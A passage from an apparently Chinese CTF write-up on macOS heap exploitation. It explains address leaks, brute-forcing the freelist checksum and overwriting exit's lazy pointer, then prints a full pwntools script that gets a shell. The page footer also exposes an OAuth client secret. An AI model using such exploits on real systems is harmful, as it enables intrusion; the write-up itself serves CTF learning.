<h3 id="劫持程序流-前置"><a href="#劫持程序流-前置" class="headerlink" title="劫持程序流 - 前置"></a>劫持程序流 - 前置</h3><p>这里利用MachO的Lazy Bind机制，复写libsystem_c.dylib的la_symbol_ptr表中的函数存放地址（不写原程序的原因是无法leak原程序加载地址）<br>查看一周发现最优的选择为<code>exit_la_symbol_ptr</code><br>我们可以在add()函数阶段输入不被认可的Size，可让程序执行exit()进而执行我们写入的地址。</p>
<p>这里发现libsystem_c.dylib的TEXT和DATA region地址相差较大，不像原程序紧挨在一起，所以这里还需要再leak一次libsystem_c.dylibd的DATA region地址。</p>
<h4 id="libsystem-c-dylib-DATA"><a href="#libsystem-c-dylib-DATA" class="headerlink" title="libsystem_c.dylib DATA"></a>libsystem_c.dylib DATA</h4><p>分析原程序时发现在<code>.got</code>内有个<code>FILE **__stdinp_ptr</code><br>可以看到开头的_p指向了某块内存的地址，这样就可以利用这个来完成leak DATA地址,这里buffer与DATA起始地址的偏移量分析下就可以得到</p>
<p><code>libsystem_c_DATA = libsystem_c_stdinptr - 0x4110</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">typedef	struct __sFILE &#123;</span><br><span class="line">	unsigned char *_p;	/* current position in (some) buffer */</span><br><span class="line">	int	_r;		/* read space left for getc() */</span><br><span class="line">	int	_w;		/* write space left for putc() */</span><br><span class="line">	short	_flags;		/* flags, below; this FILE is free if 0 */</span><br><span class="line">	short	_file;		/* fileno, if Unix descriptor, else -1 */</span><br><span class="line">	struct	__sbuf _bf;	/* the buffer (at least 1 byte, if !NULL) */</span><br><span class="line">	int	_lbfsize;	/* 0 or -_bf._size, for inline putc */</span><br><span class="line"></span><br><span class="line">	/* operations */</span><br><span class="line">	void	*_cookie;	/* cookie passed to io functions */</span><br><span class="line">	int	(*_close)(void *);</span><br><span class="line">	int	(*_read) (void *, char *, int);</span><br><span class="line">	fpos_t	(*_seek) (void *, fpos_t, int);</span><br><span class="line">	int	(*_write)(void *, const char *, int);</span><br><span class="line"></span><br><span class="line">	/* separate buffer for long sequences of ungetc() */</span><br><span class="line">	struct	__sbuf _ub;	/* ungetc buffer */</span><br><span class="line">	struct __sFILEX *_extra; /* additions to FILE to not break ABI */</span><br><span class="line">	int	_ur;		/* saved _r when _r is counting ungetc data */</span><br><span class="line"></span><br><span class="line">	/* tricks to meet minimum requirements even when malloc() fails */</span><br><span class="line">	unsigned char _ubuf[3];	/* guarantee an ungetc() buffer */</span><br><span class="line">	unsigned char _nbuf[1];	/* guarantee a getc() buffer */</span><br><span class="line"></span><br><span class="line">	/* separate buffer for fgetln() when line crosses buffer boundary */</span><br><span class="line">	struct	__sbuf _lb;	/* buffer for fgetln() */</span><br><span class="line"></span><br><span class="line">	/* Unix stdio files get aligned to block boundaries on fseek() */</span><br><span class="line">	int	_blksize;	/* stat.st_blksize (may be != _bf._size) */</span><br><span class="line">	fpos_t	_offset;	/* current lseek offset (see WARNING) */</span><br><span class="line">&#125; FILE;</span><br></pre></td></tr></table></figure>
<h3 id="劫持程序流-核心"><a href="#劫持程序流-核心" class="headerlink" title="劫持程序流 - 核心"></a>劫持程序流 - 核心</h3><p>根据前面堆的申请介绍，我们可以构造一些tiny堆，让再次申请堆时保证从freelist上获取，然后完成tiny_malloc_from_free_list()，使内部的unlink操作完成<code>next-&gt;previous = ptr-&gt;previous</code>任意数据写任意地址的操作</p>
<p>但是这里有个问题，就是在unlink前，会有个unchecksum的检查，因为程序每次运行时，都会对当前的zone生成随机的cookie，导致这里无法绕过去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next = free_list_unchecksum_ptr(rack, &amp;ptr-&gt;next);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">free_list_gen_checksum(uintptr_t ptr)</span><br><span class="line">&#123;</span><br><span class="line">	uint8_t chk;</span><br><span class="line">	chk = (unsigned char)(ptr &gt;&gt; 0);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 8);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 16);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 24);</span><br><span class="line">#if __LP64__</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 32);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 40);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 48);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 56);</span><br><span class="line">#endif</span><br><span class="line">	return chk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static MALLOC_INLINE uintptr_t  free_list_checksum_ptr(rack_t *rack, void *ptr)</span><br><span class="line">&#123;</span><br><span class="line">	uintptr_t p = (uintptr_t)ptr;</span><br><span class="line">	return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但万幸的是MacOS在对生成的cookie和pointer进行checksum后，只使用了4个有效位来保存checksum值，所以可以设定个checksum进行爆破，让程序生成的cookie在与我们的pointer在checksum后恰好等于我们自己设定的值。</p>
<p><code>value = p64(((libsystem_c_exit_la_symbol_ptr &gt;&gt; 4) | int(checksum, 16)))</code></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>下面是完整的exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#import monkeyhex</span><br><span class="line">from binascii import *</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(checksum, localFlag):</span><br><span class="line">    if localFlag == 1:</span><br><span class="line">        p = process(&apos;./applepie&apos;)</span><br><span class="line">    elif localFlag == 2:</span><br><span class="line">        p = remote(&apos;127.0.0.1&apos;, 10007)</span><br><span class="line">    elif localFlag == 3:</span><br><span class="line">        p = remote(&apos;111.186.63.147&apos;, 6666)</span><br><span class="line">    # context.log_level = &apos;debug&apos;</span><br><span class="line">    context.terminal = [&apos;tmux&apos;, &apos;split&apos;, &apos;-h&apos;]</span><br><span class="line"></span><br><span class="line">    def add(style,shape,size,name):</span><br><span class="line">        p.recvuntil(&apos;Choice: &apos;)</span><br><span class="line">        p.sendline(&apos;1&apos;)</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(style))</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(shape))</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(name)</span><br><span class="line"></span><br><span class="line">    def show(id):</span><br><span class="line">        p.recvuntil(&apos;Choice:&apos; )</span><br><span class="line">        p.sendline(&apos;2&apos;)</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">    def update(id,style,shape,size,name):</span><br><span class="line">        p.recvuntil(&apos;Choice: &apos;)</span><br><span class="line">        p.sendline(&apos;3&apos;)</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(id))</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(style))</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(shape))</span><br><span class="line">        p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(name)</span><br><span class="line"></span><br><span class="line">    def free(id):</span><br><span class="line">        p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">        p.sendline(&apos;4&apos;)</span><br><span class="line">        p.recvuntil(&apos;:&apos;)</span><br><span class="line">        p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">    id0 = add(1, 1, 0x40, &apos;aaa&apos;)</span><br><span class="line">    id1 = add(1, 1, 0x40, &apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">    # 溢出修改styleTable数组的index，完成leak Default Zone struct的introspect保存的enumerator，可以用来leak libsystem_malloc.dylib</span><br><span class="line">    # libsystem_malloc.dylib`szone_ptr_in_use_enumerator:</span><br><span class="line">    #     0x7fff68161d68 &lt;+0&gt;:  push   rbp</span><br><span class="line">    #     0x7fff68161d69 &lt;+1&gt;:  mov    rbp, rsp</span><br><span class="line">    update(0, 1, 1, 0x50, &apos;a&apos;*0x40 + p64(0x3fc0/8))</span><br><span class="line">    show(1)</span><br><span class="line">    p.recvuntil(&apos;Style: &apos;)</span><br><span class="line">    szone_ptr_in_use_enumerator = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;))</span><br><span class="line">    log.info_once(&apos;szone_ptr_in_use_enumerator = &apos; + hex(szone_ptr_in_use_enumerator))</span><br><span class="line"></span><br><span class="line">    # szone_ptr_in_use_enumerator函数在libsystem_malloc.dylib中的地址0x0000000000013D68 </span><br><span class="line">    libsystem_malloc_baseImage = szone_ptr_in_use_enumerator - 0x0000000000013D68</span><br><span class="line">    # Mac PIE的特殊性，程序本身每次运行全随机化，但动态库只有在开机时才会随机一次，此后位置都为固定</span><br><span class="line">    libsystem_c_baseImage = libsystem_malloc_baseImage - 0x161000</span><br><span class="line">    onegadget_rce = libsystem_c_baseImage + 0x0000000000025D94</span><br><span class="line">#    libsystem_c_exit_la_symbol_ptr = libsystem_c_baseImage + 0x8a0b0</span><br><span class="line">    log.info_once(&apos;libsystem_malloc.dylib = &apos; + hex(libsystem_malloc_baseImage))</span><br><span class="line">    log.info_once(&apos;libsystem_c.dylib = &apos; + hex(libsystem_c_baseImage))</span><br><span class="line">    log.info_once(&apos;libsystem_c.dylib: onegadget rce = &apos; + hex(onegadget_rce))</span><br><span class="line">#    log.info(&apos;libsystem_c.dylib: exit-&gt;la_symbol_ptr = &apos; + hex(libsystem_c_exit_la_symbol_ptr))</span><br><span class="line">#   发现libsyste_c.dylib等动态库DATA与TEXT段分离较远（vmmap）,所以先leak libsystem_c.dylib的DATA段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    update(0, 1, 1, 0x50, &apos;a&apos;*0x40 + p64(0xffffffffffffff78/8))</span><br><span class="line">    show(1)</span><br><span class="line">    p.recvuntil(&apos;Style: &apos;)</span><br><span class="line">    libsystem_c_stdinptr = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;))</span><br><span class="line">    log.info_once(&apos;FILE *stdinp-&gt;p: &apos; + hex(libsystem_c_stdinptr))</span><br><span class="line">    libsystem_c_DATA = libsystem_c_stdinptr - 0x4110</span><br><span class="line">    log.info_once(&apos;libsystem_c.dylib: DATA seg = &apos; + hex(libsystem_c_DATA))</span><br><span class="line">    libsystem_c_exit_la_symbol_ptr = libsystem_c_DATA + 0xb0</span><br><span class="line">    log.info_once(&apos;libsystem_c.dylib: exit-&gt;la_symbol_ptr = &apos; + hex(libsystem_c_exit_la_symbol_ptr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 接着步骤为</span><br><span class="line">    id2 = add(1, 1, 0x40, &apos;aaa&apos;)</span><br><span class="line">    id3 = add(1, 1, 0x40, &apos;aaa&apos;) # free</span><br><span class="line">    id4 = add(1, 1, 0x40, &apos;aaa&apos;) # -----&gt; 更改这个堆，溢出修改到下一个free块id5</span><br><span class="line">    id5 = add(1, 1, 0x40, &apos;aaa&apos;) # free</span><br><span class="line">    id6 = add(1, 1, 0x40, &apos;aaa&apos;)</span><br><span class="line">    id7 = add(1, 1, 0x40, &apos;aaa&apos;) # free</span><br><span class="line">    id8 = add(1, 1, 0x40, &apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">    # 释放id3,将其挂在freelist上</span><br><span class="line">    free(3)</span><br><span class="line">    free(5)</span><br><span class="line">    free(7)</span><br><span class="line">    # 更新块id4时，溢出修改前面释放的id5块上的元数据头</span><br><span class="line">    # -----------------------------</span><br><span class="line">    # prev_pointer | next_pointer</span><br><span class="line">    # size         | ...</span><br><span class="line">    # ...</span><br><span class="line">    #              | size</span><br><span class="line">    # -----------------------------</span><br><span class="line">    # </span><br><span class="line">    # 然后下次malloc时，会从freelist上获取之前free的id7, 再次malloc即可拿到id5</span><br><span class="line"></span><br><span class="line">    value = p64(((libsystem_c_exit_la_symbol_ptr &gt;&gt; 4) | int(checksum, 16)))</span><br><span class="line">    log.info_once(&apos;after checksum(ptr): &apos; + hex(u64(value)))</span><br><span class="line">    id7 = add(1, 1, 0x40, &apos;aaa&apos;)</span><br><span class="line">    update(4, 1, 1, 0x50, &apos;a&apos;*0x40 + p64(onegadget_rce) + value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # malloc申请内存，完成unlink操作, 将onegadget_rce写入libsystem_c_exit_la_symbol_ptr</span><br><span class="line">    p.recvuntil(&apos;Choice: &apos;)</span><br><span class="line">    p.recvuntil(&apos;Choice: &apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;) # add id 5</span><br><span class="line">    try:</span><br><span class="line">        res = p.recv() # recvice &apos;Error&apos;</span><br><span class="line">        if res.find(&apos;malloc&apos;) &gt; 0:</span><br><span class="line">            log.failure(&apos;error checksum: &apos; + res)</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            log.success(&apos;!!! currect checksum(&apos; + hex(libsystem_c_exit_la_symbol_ptr) + &apos;): &apos; + hex(u64(value)))</span><br><span class="line">        p.sendline(&apos;1&apos;) # Style</span><br><span class="line">        p.recvuntil(&apos;Choice: &apos;)</span><br><span class="line">        p.sendline(&apos;1&apos;) # Shape</span><br><span class="line">        p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">        p.sendline(&apos;9999&apos;) # 输入错误Size让程序去执行exit()流程</span><br><span class="line">        p.recv() # &apos;Error&apos;</span><br><span class="line">        p.sendline(&apos;uname&apos;)</span><br><span class="line">        res = p.recvuntil(&apos;Darwin&apos;)</span><br><span class="line">        log.info(res)</span><br><span class="line">    except:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    p.interactive() # 这里getshell后就可以退出了</span><br><span class="line">    if res.find(&apos;Darwin&apos;) &gt;= 0:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0x00, 0x23):</span><br><span class="line">    checksum = &apos;0x&apos;+&apos;&#123;:016x&#125;&apos;.format(0x23&lt;&lt;56)</span><br><span class="line">    main(checksum, 1)</span><br></pre></td></tr></table></figure>
<p><img src="/images/MacOS Heap Exploit/4.png" alt></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/pwn/">pwn</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Mac-Heap/">Mac Heap</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="https://gloxec.github.com/2019/04/08/MacOS Heap Exploit/" data-title="MacOS Heap Exploit | H o o k | 潜心习安全" data-tsina class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 

<div class="next">
<a href="/2018/12/04/LFI 2 RCE/" title="LFI 2 RCE">
 <strong>下一篇：</strong><br> 
 <span>LFI 2 RCE
</span>
</a>
</div>

</nav>

	<section id="comments" class="comment">
  <div id="blog_comment"></div>
  <script src="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/gitment.browser.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/default.css">
  <script>
  var gitment = new Gitment({
  /*id: (window.location.pathname.length < 50) ? window.location.pathname : "{{ page.date }}"*/
    id:  'Mon Apr 08 2019 11:15:37 GMT+0800',
    owner: 'gloxec',
    repo: 'blog.comment.repo',
    oauth: {
      client_id: 'bfcfaca64e8f5e195f6e',
      client_secret: 'e207a42d1b3165bcc2b07d34eb956fc5e4a0024b',
    },
  })
  gitment.render('blog_comment')
  </script>
</section>
</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MacOS的堆利用"><span class="toc-number">1.</span> <span class="toc-text">MacOS的堆利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MacOS下的堆介绍"><span class="toc-number">1.1.</span> <span class="toc-text">MacOS下的堆介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的元数据-metadata"><span class="toc-number">1.1.1.</span> <span class="toc-text">堆的元数据(metadata)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的释放-chunk本身的变化"><span class="toc-number">1.1.2.</span> <span class="toc-text">堆的释放 - chunk本身的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tiny堆："><span class="toc-number">1.1.2.1.</span> <span class="toc-text">tiny堆：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small堆"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">small堆</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的释放-chunk元数据-metadata-的变化"><span class="toc-number">1.1.3.</span> <span class="toc-text">堆的释放 - chunk元数据(metadata)的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mag-free-list"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">mag_free_list</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mag-free-bit-map"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">mag_free_bit_map</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的释放-checksum"><span class="toc-number">1.1.4.</span> <span class="toc-text">堆的释放 - checksum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magazine-t"><span class="toc-number">1.1.5.</span> <span class="toc-text">magazine_t</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的申请"><span class="toc-number">1.1.6.</span> <span class="toc-text">堆的申请</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目攻击思路"><span class="toc-number">1.2.</span> <span class="toc-text">题目攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用MacOS堆的特性leak-libsystem-c-dylib"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用MacOS堆的特性leak libsystem_c.dylib</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#libsystem-malloc-dylib地址"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">libsystem_malloc.dylib地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libsystem-c-dylib地址"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">libsystem_c.dylib地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OneGadget-RCE"><span class="toc-number">1.2.2.</span> <span class="toc-text">OneGadget RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持程序流-前置"><span class="toc-number">1.2.3.</span> <span class="toc-text">劫持程序流 - 前置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#libsystem-c-dylib-DATA"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">libsystem_c.dylib DATA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持程序流-核心"><span class="toc-number">1.2.4.</span> <span class="toc-text">劫持程序流 - 核心</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li></ol></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  
<div class="github-card">
<p class="asidetitle">Github Card</p>
<div class="github-card" data-github="gloxec" data-theme="medium"></div>
<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js"></script>
</div>



  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/Mac/" title="Mac">Mac<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/Web/" title="Web">Web<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/ctf/" title="ctf">ctf<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/iOS/" title="iOS">iOS<sup>2</sup></a></li>
		  
		
		  
			<li><a href="/categories/misc/" title="misc">misc<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/pwn/" title="pwn">pwn<sup>9</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/ret2dl攻击/" title="ret2dl攻击">ret2dl攻击<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/fmt攻击/" title="fmt攻击">fmt攻击<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Mac-IDA/" title="Mac IDA">Mac IDA<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/LFI/" title="LFI">LFI<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/debugger/" title="debugger">debugger<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/函数签名/" title="函数签名">函数签名<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/frida/" title="frida">frida<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/SSL解密/" title="SSL解密">SSL解密<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/memory-RWX/" title="memory-RWX">memory-RWX<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Mac-SIP/" title="Mac SIP">Mac SIP<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Mac-KDBG/" title="Mac KDBG">Mac KDBG<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/MachO格式/" title="MachO格式">MachO格式<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/writeup/" title="writeup">writeup<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Mac-Heap/" title="Mac Heap">Mac Heap<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="http://bestwing.me" target="_blank" title="Swing">Swing</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.bodkin.ren" target="_blank" title="老锥">老锥</a>
            
          </li>
        
          <li>
            
            	<a href="http://whereisk0shl.top" target="_blank" title="k0shl">k0shl</a>
            
          </li>
        
          <li>
            
            	<a href="http://blog.imjun.net" target="_blank" title="杨君">杨君</a>
            
          </li>
        
          <li>
            
            	<a href="http://4ch12dy.site" target="_blank" title="小学生">小学生</a>
            
          </li>
        
          <li>
            
            	<a href="https://hello-sherlock.github.io" target="_blank" title="凌迟">凌迟</a>
            
          </li>
        
          <li>
            
            	<a href="https://drops.org.cn" target="_blank" title="drop">drop</a>
            
          </li>
        
          <li>
            
            	<a href="http://pcat.cnblogs.com" target="_blank" title="pcat">pcat</a>
            
          </li>
        
          <li>
            
            	<a href="https://peterpan980927.cn" target="_blank" title="peterpan">peterpan</a>
            
          </li>
        
          <li>
            
            	<a href="https://daybr4ak.github.io" target="_blank" title="daybr4ak">daybr4ak</a>
            
          </li>
        
    </ul>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer">
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> know it <br>
			   then hack it</p>
	</section>
	 
	<div class="social-font">
		
		
		<a href="https://github.com/gloxec" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
		<a href="mailto:gloxec@gmail.com" target="_blank" class="icon-email" title="Email Me"></a>
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
		
		<a href="/about" target="_blank" title="hook">hook</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
